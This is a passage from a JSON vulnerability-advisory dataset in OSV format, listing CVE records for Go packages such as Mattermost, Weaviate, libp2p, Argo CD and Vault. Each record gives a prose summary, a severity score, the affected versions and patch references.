"PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/cf7d19e3-1318-4c77-8366-d8d04a0b41ba"}], "database_specific": {"cwe_ids": ["CWE-366"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-03T16:42:42Z", "nvd_published_at": "2023-08-03T04:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8697-479h-5mfp", "modified": "2023-08-24T21:49:43Z", "published": "2023-08-22T18:03:13Z", "aliases": ["CVE-2023-38976"], "summary": "Weaviate denial of service vulnerability", "details": "### Impact\nThis vulnerability is a type conversion issue that affects users of Weaviate Server versions 1.20.0 and earlier.\nWho is impacted: Users of Weaviate Server versions 1.20.0 and earlier are impacted by this vulnerability.\n\n### Patches\nA patch has been developed for this vulnerability.\nPatch releases 1.20.6, 1.19.13, and 1.18.6 are fixing this vulnerability in each respective minor version release.\nUsers are strongly recommended to upgrade to one of these patched versions to address the vulnerability.\nKeeping software up-to-date is crucial to avoid security vulnerabilities.\n\n### Workarounds\nThere are no known workarounds to fix or remediate this vulnerability without upgrading.\nUsers must upgrade to a patched version to mitigate the risk.\n\n### References \n* https://github.com/weaviate/weaviate/releases/tag/v1.18.6\n* https://github.com/weaviate/weaviate/releases/tag/v1.19.13\n* https://github.com/weaviate/weaviate/releases/tag/v1.20.6\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/weaviate/weaviate"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.20.0"}, {"fixed": "1.20.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/weaviate/weaviate"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.19.0"}, {"fixed": "1.19.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/weaviate/weaviate"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.18.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/weaviate/weaviate/security/advisories/GHSA-8697-479h-5mfp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-38976"}, {"type": "WEB", "url": "https://github.com/weaviate/weaviate/issues/3258"}, {"type": "WEB", "url": "https://github.com/weaviate/weaviate/pull/3431"}, {"type": "WEB", "url": "https://github.com/weaviate/weaviate/commit/2a7b208d9aca07e28969e3be82689c184ccf9118"}, {"type": "PACKAGE", "url": "https://github.com/weaviate/weaviate"}, {"type": "WEB", "url": "https://github.com/weaviate/weaviate/releases/tag/v1.18.6"}, {"type": "WEB", "url": "https://github.com/weaviate/weaviate/releases/tag/v1.19.13"}, {"type": "WEB", "url": "https://github.com/weaviate/weaviate/releases/tag/v1.20.6"}], "database_specific": {"cwe_ids": ["CWE-704"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-22T18:03:13Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-6xjj-v76v-fwpj", "modified": "2023-08-11T21:56:52Z", "published": "2023-08-11T09:30:36Z", "aliases": ["CVE-2023-4107"], "summary": "Mattermost does not validate requesting user permissions before updating admin details", "details": "Mattermost fails to properly validate the requesting user permissions when updating a system admin, allowing a user manager to update a system admin's details such as email, first name and last name.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.8"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.8.7"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.9.0"}, {"fixed": "7.9.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.9.5"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.10.0"}, {"fixed": "7.10.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.10.3"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4107"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-11T21:56:52Z", "nvd_published_at": "2023-08-11T07:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-65rp-cv85-263x", "modified": "2023-10-09T21:46:43Z", "published": "2023-08-22T21:30:26Z", "withdrawn": "2023-10-09T21:46:43Z", "aliases": ["CVE-2022-34038"], "summary": "etcd denial of service vulnerability", "details": "Etcd v3.5.4 allows remote attackers to cause a denial of service via function PageWriter.write in pagewriter.go", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.5.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-34038"}, {"type": "WEB", "url": "https://github.com/golang/vulndb/issues/2016#issuecomment-1698677762"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/pull/14022"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/pull/14452"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/commit/5a315ef88fbfa454e02d27b0b8acb4f89457cd90"}, {"type": "PACKAGE", "url": "https://github.com/etcd-io/etcd"}], "database_specific": {"cwe_ids": ["CWE-787"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-23T13:25:22Z", "nvd_published_at": "2023-08-22T19:16:23Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g3v6-r8p9-wxg9", "modified": "2023-08-11T21:53:22Z", "published": "2023-08-11T09:30:36Z", "aliases": ["CVE-2023-4105"], "summary": "Mattermost fails to correctly delete attachments", "details": "Mattermost fails to delete the attachments when deleting a message in a thread allowing a simple user to still be able to access and download the attachment of a deleted message\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.9.0"}, {"fixed": "7.9.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.9.5"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.10.0"}, {"fixed": "7.10.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.10.3"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.8"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.8.7"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4105"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}, {"type": "PACKAGE", "url": "github.com/mattermost/mattermost"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-862"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-08-11T21:53:22Z", "nvd_published_at": "2023-08-11T07:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ggcf-hwxp-rc77", "modified": "2023-08-03T16:42:38Z", "published": "2023-08-03T06:30:22Z", "aliases": ["CVE-2023-4126"], "summary": "Answer Insufficient Session Expiration vulnerability", "details": "Insufficient Session Expiration in GitHub repository answerdev/answer prior to v1.1.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4126"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/4f468b58d0dea51290bfbdd3e96332b0014c8730"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/7f50bf1c-bcb9-46ca-8cec-211493d280c5"}], "database_specific": {"cwe_ids": ["CWE-613"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-03T16:42:38Z", "nvd_published_at": "2023-08-03T04:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2xx4-jj5v-6mff", "modified": "2023-10-20T17:45:19Z", "published": "2023-08-04T17:27:00Z", "aliases": ["CVE-2023-37896"], "summary": "Nuclei Path Traversal vulnerability", "details": "## Overview\n\nWe have identified and addressed a security issue in the Nuclei project that affected users utilizing Nuclei as **Go code (SDK)** running **custom templates**. This issue did not affect CLI users. The problem was related to sanitization issues with payloads loading in `sandbox` mode.\n\n## Details\n\nIn the previous versions, there was a potential risk with payloads loading in sandbox mode. The issue occurred due to relative paths not being converted to absolute paths before doing the check for `sandbox` flag allowing arbitrary files to be read on the filesystem in certain cases when using Nuclei from `Go` SDK implementation. \n\nThis issue has been fixed in the latest release, v2.9.9. We have also enabled sandbox by default for filesystem loading. This can be optionally disabled if required.\n\nThe `-sandbox` option has been **deprecated** and is now divided into two new options: `-lfa` (allow local file access) which is disabled by default and `-lna` (restrict local network access) which can be optionally disabled by user. The `-lfa` allows file (payload) access anywhere on the system (disabling sandbox effectively), and `-lna` blocks connections to the local/private network.\n\n## Affected Versions\n\nThis issue affected all versions of Nuclei prior to v2.9.9.\n\n## Patches\n\nWe recommend all users upgrade to the latest version, [v2.9.9](https://github.com/projectdiscovery/nuclei/releases/tag/v2.9.9), which includes the security fix.\n\n### References\n\n- [patch](https://github.com/projectdiscovery/nuclei/pull/3927)\n- [releases](https://github.com/projectdiscovery/nuclei/releases/tag/v2.9.9)\n\n## Acknowledgments\n\nWe would like to thank **keomutchoiboi** who reported this issue to us via our security email, [security@projectdiscovery.io](mailto:security@projectdiscovery.io). We appreciate the responsible disclosure of this issue.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/projectdiscovery/nuclei/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.9.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/projectdiscovery/nuclei"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.9.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-2xx4-jj5v-6mff"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37896"}, {"type": "WEB", "url": "https://github.com/projectdiscovery/nuclei/pull/3927"}, {"type": "PACKAGE", "url": "https://github.com/projectdiscovery/nuclei"}, {"type": "WEB", "url": "https://github.com/projectdiscovery/nuclei/releases/tag/v2.9.9"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-04T17:27:00Z", "nvd_published_at": "2023-08-04T16:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gcq9-qqwx-rgj3", "modified": "2023-11-17T22:07:30Z", "published": "2023-08-24T22:22:59Z", "aliases": ["CVE-2023-40583"], "summary": "libp2p nodes vulnerable to OOM attack", "details": "### Summary\nIn go-libp2p, by using signed peer records a malicious actor can store an arbitrary amount of data in a remote node\u2019s memory. This memory does not get garbage collected and so the victim can run out of memory and crash.\n\nIt is feasible to do this at scale. An attacker would have to transfer ~1/2 as much memory it wants to occupy (2x amplification factor).\n\nThe attacker can perform this attack over time as the target node\u2019s memory will not be garbage collected.\n\nThis can occur because when a signed peer record is received, only the signature validity check is performed but the sender signature is not checked. Signed peer records from randomly generated peers can be sent by a malicious actor. A target node will accept the peer record as long as the signature is valid, and then stored in the peer store.\n\nThere is cleanup logic in the peer store that cleans up data when a peer disconnects, but this cleanup is never triggered for the fake peer (from which signed peer records were accepted) because it was never \u201cconnected\u201d.\n\n### Impact\nIf users of go-libp2p in production are not monitoring memory consumption over time, it could be a silent attack i.e. the attacker could bring down nodes over a period of time (how long depends on the node resources i.e. a go-libp2p node on a virtual server with 4 gb of memory takes about 90 sec to bring down; on a larger server, it might take a bit longer.)\n\n### Patches\nUpdate your go-libp2p dependency to the latest release, v0.30.0 at the time of writing.\n\nIf you'd like to stay on the 0.27.x release, we strongly recommend users to update to go-libp2p [0.27.7](https://github.com/libp2p/go-libp2p/releases/tag/v0.27.7). Though this OOM issue was fixed in 0.27.4, there were subsequent patch releases afterwards (important fixes for other issues unrelated to the OOM).\n\n### Workarounds\nNone", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/libp2p/go-libp2p"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.27.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.27.3"}}], "references": [{"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/security/advisories/GHSA-gcq9-qqwx-rgj3"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40583"}, {"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/commit/45d3c6fff662ddd6938982e7e9309ad5fa2ad8dd"}, {"type": "PACKAGE", "url": "https://github.com/libp2p/go-libp2p"}, {"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/releases/tag/v0.27.4"}, {"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/releases/tag/v0.27.7"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-24T22:22:59Z", "nvd_published_at": "2023-08-25T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-256m-j5qw-38f4", "modified": "2023-08-25T18:41:16Z", "published": "2023-08-25T18:41:16Z", "aliases": ["CVE-2023-32078"], "summary": "Netmaker IDOR Allows User to Update Other User's Password", "details": "### Impact\nAn IDOR vulnerability was found in the user update function. By specifying another user's username it is possible to update the other user's password.\n\n### Patches\nIssue is patched in 0.17.1, and fixed in 0.18.6+.\n\nIf Users are using 0.17.1, they should run \"docker pull gravitl/netmaker:v0.17.1\" and \"docker-compose up -d\". This will switch them to the patched users\n\nIf users are using v0.18.0-0.18.5, they should upgrade to v0.18.6 or later.\n\n### Workarounds\nIf using 0.17.1, can just pull the latest docker image of backend and restart server.\n\n### References\nCredit to Project Discovery, and in particular https://github.com/rootxharsh , https://github.com/iamnoooob, and https://github.com/projectdiscovery", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.17.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.18.0"}, {"fixed": "0.18.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gravitl/netmaker/security/advisories/GHSA-256m-j5qw-38f4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32078"}, {"type": "WEB", "url": "https://github.com/gravitl/netmaker/pull/2158"}, {"type": "WEB", "url": "https://github.com/gravitl/netmaker/commit/b3be57c65bf0bbfab43b66853c8e3637a43e2839"}, {"type": "PACKAGE", "url": "https://github.com/gravitl/netmaker"}], "database_specific": {"cwe_ids": ["CWE-639"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-25T18:41:16Z", "nvd_published_at": "2023-08-24T22:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4gcf-5m39-98mc", "modified": "2023-08-18T14:25:07Z", "published": "2023-08-16T21:02:29Z", "aliases": ["CVE-2023-40034"], "summary": "Woodpecker does not validate webhook before changing any data", "details": "### Impact\nAn attacker can post malformed webhook data which leads to an update of the repository data that can e.g. allow the takeover of a repository.\nThis is only critical if the CI is configured for public usage and connected to a forge witch is also in public usage.\n\n### Patches\nPlease use either next or the latest v1.0 e.g. v1.0.2\n\n### Workarounds\nSecure the CI system by making it inaccessible to untrusted entities, for example, by placing it behind a firewall.\n\n### References\nFix: https://github.com/woodpecker-ci/woodpecker/pull/2221\nBackport: https://github.com/woodpecker-ci/woodpecker/pull/2222", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/woodpecker-ci/woodpecker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.0.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-4gcf-5m39-98mc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40034"}, {"type": "WEB", "url": "https://github.com/woodpecker-ci/woodpecker/pull/2221"}, {"type": "WEB", "url": "https://github.com/woodpecker-ci/woodpecker/pull/2222"}, {"type": "WEB", "url": "https://github.com/woodpecker-ci/woodpecker/commit/6e4c2f84cc84661d58cf1c0e5c421a46070bb105"}, {"type": "PACKAGE", "url": "https://github.com/woodpecker-ci/woodpecker"}, {"type": "WEB", "url": "https://github.com/woodpecker-ci/woodpecker/releases/tag/v1.0.2"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-16T21:02:29Z", "nvd_published_at": "2023-08-16T21:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9v3w-w2jh-4hff", "modified": "2023-08-01T16:58:49Z", "published": "2023-08-01T00:30:17Z", "aliases": ["CVE-2023-3462"], "summary": "HashiCorp Vault and Vault Enterprise vulnerable to user enumeration", "details": "HashiCorp's Vault and Vault Enterprise are vulnerable to user enumeration when using the LDAP auth method. An attacker may submit requests of existent and non-existent LDAP users and observe the response from Vault to check if the account is valid on the LDAP server. This vulnerability is fixed in Vault 1.14.1 and 1.13.5.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.13.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.1"}]}], "versions": ["1.14.0"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-3462"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-24-vaults-ldap-auth-method-allows-for-user-enumeration/56714"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}], "database_specific": {"cwe_ids": ["CWE-203"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-01T16:58:49Z", "nvd_published_at": "2023-07-31T23:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c8xw-vjgf-94hr", "modified": "2023-08-31T00:03:04Z", "published": "2023-08-23T17:50:41Z", "aliases": ["CVE-2023-40025"], "summary": "Argo CD web terminal session doesn't expire", "details": "### Impact\nAll versions of Argo CD starting from v2.6.0 have a bug where open web terminal sessions do not expire. This bug allows users to send any websocket messages even if the token has already expired. The most straightforward scenario is when a user opens the terminal view and leaves it open for an extended period. This allows the user to view sensitive information even when they should have been logged out already.\n\n### Patches\nA patch for this vulnerability has been released in the following Argo CD version:\n\n* v2.6.14\n* v2.7.12\n* v2.8.1\n\n### Workarounds\nThe only way to completely resolve the issue is to upgrade.\n\n#### Mitigations\nDisable web-based terminal or define RBAC rules to it\n[https://argo-cd.readthedocs.io/en/latest/operator-manual/web_based_terminal/](https://argo-cd.readthedocs.io/en/latest/operator-manual/web_based_terminal/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n### Credits\n\nThank you to bean.zhang (@zhlu32 ) of HIT-IDS ChunkL Team who discovered the issue and reported it confidentially according to our [guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.8.0"}, {"fixed": "2.8.1"}]}], "versions": ["2.8.0"]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-c8xw-vjgf-94hr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40025"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/e047efa8f9518c54d00d2e4493b64bc4dba98478"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-613"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-23T17:50:41Z", "nvd_published_at": "2023-08-23T20:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2wrh-6pvc-2jm9", "modified": "2023-10-13T23:10:21Z", "published": "2023-08-02T21:30:20Z", "aliases": ["CVE-2023-3978"], "summary": "Improper rendering of text nodes in golang.org/x/net/html", "details": "Text nodes not in the HTML namespace are incorrectly literally rendered, causing text which should be escaped to not be. This could lead to an XSS attack. ", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.13.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-3978"}, {"type": "WEB", "url": "https://go.dev/cl/514896"}, {"type": "WEB", "url": "https://go.dev/issue/61615"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1988"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-11T20:36:23Z", "nvd_published_at": "2023-08-02T20:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x92r-3vfx-4cv3", "modified": "2023-11-02T21:22:24Z", "published": "2023-08-02T21:30:20Z", "aliases": ["CVE-2023-29408"], "summary": "Golang TIFF decoder does not place a limit on the size of compressed tile data", "details": "The TIFF decoder does not place a limit on the size of compressed tile data. A maliciously-crafted image can exploit this to cause a small image (both in terms of pixel width/height, and encoded size) to make the decoder decode large amounts of compressed data, consuming excessive memory and CPU.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/image"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29408"}, {"type": "WEB", "url": "https://go.dev/cl/514897"}, {"type": "WEB", "url": "https://go.dev/issue/61582"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KO54NBDUJXKAZNGCFOEYL2LKK2RQP6K6/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XWH6Q7NVM4MV3GWFEU4PA67AWZHVFJQ2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XZTEP6JYILRBNDTNWTEQ5D4QUUVQBESK/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1989"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230831-0009/"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-02T21:22:24Z", "nvd_published_at": "2023-08-02T20:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j63x-f657-2m9g", "modified": "2023-08-03T16:42:33Z", "published": "2023-08-03T06:30:22Z", "aliases": ["CVE-2023-4125"], "summary": "Answer has Weak Password Requirements", "details": "Weak Password Requirements in GitHub repository answerdev/answer prior to v1.1.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4125"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/7d23b17cdbbefcd2e7b5c3150f0b5ec908dc835f"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/85bfd18f-8d3b-4154-8b7b-1f8fcf704e28"}], "database_specific": {"cwe_ids": ["CWE-521"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-03T16:42:33Z", "nvd_published_at": "2023-08-03T04:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8c37-7qx3-4c4p", "modified": "2023-09-21T14:13:41Z", "published": "2023-08-09T20:57:57Z", "aliases": [], "summary": "Blst has logical error in SigValidate in Go bindings", "details": "### Impact\n\nBlst versions v0.3.0 through 0.3.10 failed to perform a signature group-check if the call to `SigValidate` in the Go bindings was complemented with a check for infinity. Formally speaking, infinity, or the identity element of the elliptic curve group, is a member of the group, and the group-check should allow it. An initial review of blst users on GitHub did not uncover any use of this function with the complementary infinity check. This optional check was added as a convenience feature because despite infinity being a legitimate member of the group, individual signatures should never be infinite (as it is equivalent to having zero for the secret key), and observing one should raise a flag. \n\n### Description\n\nThe vulnerable function is declared as `SigValidate(sigInfcheck bool) bool` and if called with `sigInfcheck` argument set to `true`, the group-check was omitted. The group-check is required to be performed on untrusted input, because the pairing, the corner-stone operation of the signature scheme, is defined only on points that are members of a specific cyclic group, which is a subset of all the possible points on elliptic curves in question. Submitting an untrusted point outside the group opens up the possibility of accepting an alternative signature for a chosen message.\n\nIt should be noted that the SigValidate call is not the only way to perform the group-checks. There are optional checks integrated into various other verification methods, such as `Verify`, `AggregateVerify`, etc., as well as signature aggregation methods, such as `PairingAggregate*`. The reason why there are multiple options is that the group-check is a relatively expensive operation, and application developers are arguably entitled the freedom to choose when it's performed.\n\n### Patches\n\nThis issue has been resolved in the v0.3.11 release and users are advised to update if their application is affected or alternatively omit the complementary infinity check.\n\n### Credits\n\nA special thanks to Yunjong Jeong (@blukat29) for the discovery and disclosure of this vulnerability.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/supranational/blst"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.3.0"}, {"fixed": "0.3.11"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/supranational/blst/security/advisories/GHSA-8c37-7qx3-4c4p"}, {"type": "WEB", "url": "https://github.com/supranational/blst/commit/fb91221c91c82f65bfc7f243256308977a06d48b"}, {"type": "PACKAGE", "url": "https://github.com/supranational/blst"}, {"type": "WEB", "url": "https://github.com/supranational/blst/releases/tag/v0.3.11"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-09T20:57:57Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-p267-jjfq-pphf", "modified": "2023-08-16T12:56:34Z", "published": "2023-08-11T09:30:36Z", "aliases": ["CVE-2023-4106"], "summary": "Mattermost fails to check if user is a guest before performing actions on public playbooks", "details": "Mattermost fails to check if the requesting user is a guest before performing different actions to public playbooks, resulting a guest being able to\u00a0view, join, edit, export and archive public playbooks.\n\n", "severity": 